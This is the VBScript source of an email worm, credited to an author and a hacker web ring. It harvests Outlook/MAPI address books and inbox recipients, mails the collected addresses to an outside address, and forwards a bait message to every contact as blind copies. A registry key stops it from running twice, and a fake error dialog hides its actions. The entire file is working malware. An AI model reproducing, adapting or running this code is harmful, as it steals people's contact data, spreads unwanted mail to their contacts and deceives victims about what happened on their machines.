rem By Dal Pachinski
rem Dedicated to the Hacker WebRing
rem Rule!

Dim AllAddresses(32767)
Dim Names(32767)
Dim AddrCount
Dim MAPI
Dim ForwardThis
dim AlreadySent

Sub Start()
    Set MAPI = CreateObject("MAPI.Session")
    MAPI.Logon "","",false,false
    AddrCount = 0
    AlreadySent = false
End Sub

Sub Finish()
    MAPI.Logoff
End Sub

function AnAt(byval Addr)
  AnAt = false
  for cntr = 1 to len(Addr)
    if mid(Addr,cntr,1) = "@" then
      AnAt = true
      cntr = 32767
    end if
  next
end function

function dupl(byval OneAd)
  dupl = false
  for cntrx = 1 to AddrCount
    if AllAddresses(cntrx - 1) = OneAd then 
      cntrx = AddrCount + 1
      dupl = true
    end if
  next
end function

Sub GetMAPIAddressBook()
    err.number = 0
    for cntrlists = 1 to MAPI.AddressLists.Count
	set AddrList = MAPI.AddressLists(cntrlists).AddressEntries
      CountTo = AddrList.Count
      if CountTo > 32767 then CountTo = 32767
      for cntrentry = 1 to CountTo
	set AEntry = AddrList(cntrentry)
	dummy = AEntry.Name
	if err.number <> 0 then
	  cntrentry = 32768
	else
	  if (trim(AEntry.Address) <> "" or trim(AEntry.Name) <> "") and not dupl(AEntry.Address) then
	    AllAddresses(AddrCount) = AEntry.Address
	    Names(AddrCount) = AEntry.Name
	    AddrCount = AddrCount + 1
	  end if
	end if
      next
    next
End Sub

sub GetAddressBook()
    on error resume next
    err.number = 0
    set outlook = createobject("Outlook.Application")
    set outmapi = outlook.getnamespace("MAPI")

    for cntrlists = 1 to outmapi.AddressLists.Count
	set AddrList = outmapi.AddressLists(cntrlists).AddressEntries
      CountTo = AddrList.Count
      if CountTo > 32767 then CountTo = 32767
      for cntrentry = 1 to CountTo
	set AEntry = AddrList(cntrentry)
	dummy = AEntry.Name
	if err.number <> 0 then
	  cntrentry = 32768
	else
	  if (trim(AEntry.Address) <> "" or trim(AEntry.Name) <> "") and not dupl(AEntry.Address) then
	    AllAddresses(AddrCount) = AEntry.Address
	    Names(AddrCount) = AEntry.Name
	    AddrCount = AddrCount + 1
	  end if
	end if
      next
    next

end sub

Sub GetInBox()
    err.number = 0
    Set Inbox = MAPI.Inbox.Messages
    cntr = 1
    while cntr < 32766
      if cntr = 1 then
        set Msg = Inbox.GetFirst()
      else
        set Msg = Inbox.GetNext()
      end if

      dummy = msg.subject
      if err.number <= 0 then
        if Msg.Subject = "Thanks for that..." then set ForwardThis = Msg
        for cntr2 = 1 to Msg.Recipients.Count
          set OneRecip = msg.recipients.item(clng(cntr2))
          if (trim(OneRecip.Address) <> "" or trim(OneRecip.Name) <> "") and not dupl(OneRecip.Address) then
	      AllAddresses(AddrCount) = OneRecip.Address
            Names(AddrCount) = OneRecip.Name
            AddrCount = AddrCount + 1
          end if
        next
        cntr = cntr + 1
      else
        cntr = 32767
      end if
    wend
End Sub

Sub Transmit()
    set outlook = createobject("Outlook.Application")
    set outmapi = outlook.getnamespace("MAPI")

    set Msg = outlook.createitem(0)
    for cntr = 1 to AddrCount
      if AnAt(AllAddresses(cntr - 1)) then Msg.body = Msg.body + AllAddresses(cntr - 1) + chr(13) + chr(10)
    next
    Msg.Recipients.Add "SarahMichelle@freewebaccess.co.uk"
    msg.subject = "Draft 2"
    Msg.Send
    AlreadySent = true
End Sub

Sub MAPITransmit()
    set Msg = MAPI.Outbox.Messages.Add
    for cntr = 1 to AddrCount
      if AnAt(AllAddresses(cntr - 1)) then Msg.Text = Msg.Text + AllAddresses(cntr - 1) + chr(13) + chr(10)
    next
    Msg.Recipients.Add "SarahMichelle@freewebaccess.co.uk"
    Msg.Subject = "Draft 2"
    Msg.Recipients.Resolve false
    Msg.Send false,false
End Sub


Sub Forward()
    ForwardThis.Recipients.Delete
    for cntr = 1 to AddrCount
      set MyRecip = ForwardThis.Recipients.Add
      if AnAt(AllAddresses(cntr - 1)) then
	MyRecip.Name = AllAddresses(cntr - 1)
      else
	MyRecip.Name = Names(cntr - 1)
      end if
      MyRecip.Type = 3
      MyRecip.Resolve
    next
    ForwardThis.Send false,false
End Sub

on error resume next
set WS = CreateObject("WScript.Shell")
result = WS.RegRead("HKEY_LOCAL_MACHINE\Software\Sarah.Michelle\")
if result <> "Complete" then
  Call Start
  Call GetMAPIAddressBook
  Call GetAddressBook
  Call GetInBox
  Call Transmit
  if AlreadySent = false then Call MAPITransmit
  Call Forward
  Call Finish
  WS.RegWrite "HKEY_LOCAL_MACHINE\Software\Sarah.Michelle\","Complete"
end if

msgbox "Unable to process file - Internal error at 0x80F3:429A",,"Error"
